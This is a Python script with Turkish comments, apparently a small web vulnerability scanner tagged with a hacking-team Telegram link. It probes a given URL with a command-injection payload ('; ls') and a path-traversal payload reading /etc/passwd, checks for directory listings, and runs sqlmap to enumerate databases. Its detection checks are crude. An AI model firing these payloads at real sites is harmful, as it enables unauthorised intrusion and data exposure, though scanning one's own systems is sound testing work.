import requests
from bs4 import BeautifulSoup
import argparse
from termcolor import colored
import subprocess
import sys
import os
import pyfiglet
import colorama
from colorama import Fore, Back, Style

# ASCII Sanatı
def display_ascii_art():
    # Figlet formatında "Root" metnini yazdır
    metin = "Root"
    ascii_art = pyfiglet.figlet_format(metin)
    # Renkleri uygula (kırmızı)
    renkli_ascii = Fore.RED + ascii_art
    
    # colorama'yı başlat
    colorama.init()
    
    # ASCII sanatını yazdır
    print(renkli_ascii)
    
    # "t.me/sarsilmazhackteam" yazısını ASCII sanatının altına yazdır
    print(colored("t.me/sarsilmazhackteam", 'red'))

# Güvenli HTTP isteği
def safe_request(url, method='GET', data=None):
    try:
        if method == 'POST':
            response = requests.post(url, data=data, timeout=10)
        else:
            response = requests.get(url, timeout=10)
        response.raise_for_status()
        return response
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] HTTP isteği başarısız: {str(e)}", 'red'))
        sys.exit(1)

import subprocess

# SQLMap ile Veritabanı Tespiti
def detect_sql_database(url):
    print(colored("[*] SQLMap ile veritabanları tespit ediliyor...", 'yellow'))
    try:
        # sqlmap komutunu çalıştır
        command = ["sqlmap", "-u", url, "--batch", "--dbs", "--output-dir=/tmp/sqlmap_output"]
        result = subprocess.run(command, capture_output=True, text=True)

        # SQLMap çıktısını sadece veritabanı isimleriyle yazdır
        if "available databases" in result.stdout.lower():
            # Veritabanı isimlerini bul ve yazdır
            databases = []
            in_databases_section = False
            for line in result.stdout.splitlines():
                # Filtreleme işlemi yaparak veritabanı isimlerini al
                if "available databases" in line.lower():
                    in_databases_section = True
                    continue
                if in_databases_section:
                    if line.strip().startswith("[*]"):
                        continue  # Bu satırı atla
                    if line.strip():
                        databases.append(line.strip())
            if databases:
                print(colored("[!] Bulunan veritabanları:", 'red'))
                for db in databases:
                    print(db)
        else:
            print(colored("[+] SQL Injection açığı bulunamadı veya SQLMap çalıştırılamadı.", 'green'))
    except FileNotFoundError:
        print(colored("[!] SQLMap yüklü değil. Lütfen sqlmap'in kurulu olduğundan emin olun.", 'red'))
    except Exception as e:
        print(colored(f"[!] SQLMap çalıştırılırken bir hata oluştu: {str(e)}", 'red'))
        

# Komut Enjeksiyonu Testi
def test_command_injection(url):
    payload = "; ls"
    test_url = f"{url}{payload}"
    response = safe_request(test_url)
    if "bin" in response.text or "usr" in response.text:
        print(colored("[!] Komut Enjeksiyonu açığı bulundu!", 'red'))
        return True
    print(colored("[+] Komut Enjeksiyonu açığı bulunamadı.", 'green'))
    return False

# Dizin Gezinmesi Testi
def test_open_directory(url):
    response = safe_request(url)
    if "index of" in response.text.lower() or "parent directory" in response.text.lower():
        print(colored("[!] Açık dizin tespit edildi!", 'red'))
        return True
    print(colored("[+] Açık dizin bulunamadı.", 'green'))
    return False

# Dosya Dahil Etme Testi
def test_file_inclusion(url):
    payload = "?page=../../../../etc/passwd"
    test_url = f"{url}{payload}"
    response = safe_request(test_url)
    if "root:" in response.text:
        print(colored("[!] Dosya Dahil Etme açığı bulundu!", 'red'))
        return True
    print(colored("[+] Dosya Dahil Etme açığı bulunamadı.", 'green'))
    return False

# Tarama Fonksiyonu
def scan_url(url):
    print(colored(f"\n[+] {url} taranıyor...\n", 'yellow'))
    test_command_injection(url)
    test_open_directory(url)
    test_file_inclusion(url)
    detect_sql_database(url)

# Ana Fonksiyon
def main():
    display_ascii_art()
    parser = argparse.ArgumentParser(description="Linux İçin Güvenli Web Zafiyeti Tarayıcı")
    parser.add_argument("url", help="Taranacak URL")
    args = parser.parse_args()

    # URL'nin geçerli olup olmadığını kontrol et
    if not args.url.startswith("http://") and not args.url.startswith("https://"):
        print(colored("[!] Lütfen geçerli bir URL girin. (http:// veya https:// ile başlamalı)", 'red'))
        sys.exit(1)

    scan_url(args.url)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] İşlem kullanıcı tarafından durduruldu.", 'red'))
        sys.exit(0)
